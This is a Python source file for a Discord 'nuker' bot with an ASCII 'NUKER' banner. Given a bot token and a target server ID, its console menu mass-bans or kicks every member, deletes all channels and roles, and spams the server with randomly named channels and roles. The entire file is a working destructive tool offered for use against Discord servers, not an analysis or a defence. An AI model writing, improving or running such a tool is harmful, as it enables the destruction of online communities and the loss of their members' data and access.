import discord, sys, random, string, os, time
from . import bot_token
from discord.ext import commands
from colorama import Fore

os.system("cls")
print(f"""{Fore.LIGHTRED_EX}

 ███▄    █ █    ██ ██ ▄█▓█████ ██▀███  
 ██ ▀█   █ ██  ▓██▒██▄█▒▓█   ▀▓██ ▒ ██▒
▓██  ▀█ ██▓██  ▒██▓███▄░▒███  ▓██ ░▄█ ▒
▓██▒  ▐▌██▓▓█  ░██▓██ █▄▒▓█  ▄▒██▀▀█▄  
▒██░   ▓██▒▒█████▓▒██▒ █░▒████░██▓ ▒██▒
░ ▒░   ▒ ▒░▒▓▒ ▒ ▒▒ ▒▒ ▓░░ ▒░ ░ ▒▓ ░▒▓░
░ ░░   ░ ▒░░▒░ ░ ░░ ░▒ ▒░░ ░  ░ ░▒ ░ ▒░
   ░   ░ ░ ░░░ ░ ░░ ░░ ░   ░    ░░   ░ 
         ░   ░    ░  ░     ░  ░  ░     
                                       
""")
print("\n")
intents = discord.Intents.all()
client = commands.Bot(command_prefix = '.', intents=intents)

async def ban_all(guild_id):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for member in guild.members:
        try:
            await member.ban(reason=None)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")


async def kick_all(guild_id):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for member in guild.members:
        print(guild.members)
        try:
            await member.kick(reason=None)
        except Exception as e:
            pass
            # print(f"{Fore.RED}[ERROR] {e}")


async def create_channels(guild_id, amount):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for _ in range(amount):
        try:
            overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages= True)}
            await guild.create_text_channel(''.join(random.choice(string.ascii_lowercase) for i in range(17)), overwrites=overwrites)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")


async def delete_channels(guild_id):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")


async def create_roles(guild_id, amount):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for _ in range(amount):
        try:
            await guild.create_role(name=''.join(random.choice(string.ascii_lowercase) for i in range(10)))
        except:
            print(f"{Fore.RED}[ERROR] I Don't Have Permission for That!")


async def delete_roles(guild_id):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for role in guild.roles:
        print(role)
        try:
            await role.delete()
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")

@client.event
async def on_ready():
    print("Bot is ready!\n\n")
    while True:
        print("[CONSOLE] [1] Go Back.")
        print("[CONSOLE] [2] Ban all users.")
        print("[CONSOLE] [3] Kick all users.")
        print("[CONSOLE] [4] Mass channel create.")
        print("[CONSOLE] [5] Delete all channels.")
        print("[CONSOLE] [6] Mass role create.")
        print("[CONSOLE] [7] Delete all roles")
        try:
            option = int(input("\n: "))
        except:
            print(f"\n{Fore.RED}[ERROR] Choose a number between 0-6!")
            time.sleep(1)
            print(f"{Fore.RED}\n[REMINDER] To restart the nuker, Repoen The Program!!\n")
            time.sleep(3)
            await client.close()
            return

        if option == 1:
            print(f"{Fore.RED}\n[REMINDER] To restart the nuker, Repoen The Program!!\n")
            time.sleep(3)
            await client.close()
            return

        guild_target = int(input("\nServer target ID: "))

        if option == 2:
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await ban_all(guild_target)
            print("Done!")

        elif option == 3:
            os.system("cls")
            print("starting...")
            time.sleep(3)   
            await kick_all(guild_target)
            print("Done!")

        elif option == 4:
            am = int(input("Amount of channels to create (nums): "))
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await create_channels(guild_target, am)
            print("Done!")

        elif option == 5:
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await delete_channels(guild_target)
            print("Done!")

        elif option == 6:
            am = int(input("Amount of roles to create (nums): "))
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await create_roles(guild_target, am)
            print("Done!")

        elif option == 7:
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await delete_roles(guild_target)
            print("Done!")

try:
    client.run(bot_token)
except discord.errors.LoginFailure:
    print(f"{Fore.RED}[ERROR] Bad Token!")
    time.sleep(5)
    sys.exit(0)

except:
    pass
